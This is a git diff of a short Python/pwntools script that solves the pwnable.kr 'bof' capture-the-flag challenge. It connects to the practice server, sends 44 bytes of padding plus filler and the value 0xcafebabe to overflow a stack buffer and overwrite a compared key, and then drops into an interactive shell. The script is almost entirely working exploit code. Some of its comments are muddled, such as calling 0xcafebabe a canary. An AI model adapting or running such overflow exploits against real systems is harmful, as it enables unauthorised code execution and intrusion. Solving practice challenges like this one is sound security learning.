@@ -1,19 +1,12 @@
-import struct
 from pwn import *
 
-run = process('./bof')
-# struct.pack('<L', firstfour) * 4 + struct.pack('<L', last)])
-
-print(run.recv('overflow me :'))
-
-
-#print "A"*28 +struct.pack("<L",0xcafebabe)
-
-
-'''
->>> 0xcafebabe
-3405691582
-
->>> 
-
-'''
+run = remote('pwnable.kr', 9000)
+print(run.recv(timeout = 0))
+# reading the code bof.c we see that there is a buffer has been set to a 32 bytes. then a compare operation
+# by running objdump -D bof
+# we can see that func is allocated with 0x2c=44 of memory
+# Bs to fill BasePointer
+# Cs to fill InstructionPointer
+# CAFEBABE is the acting as a canary
+run.sendline('A' * 0x2c +'B'*4 + 'C'*4 + '\xbe\xba\xfe\xca')
+run.interactive()
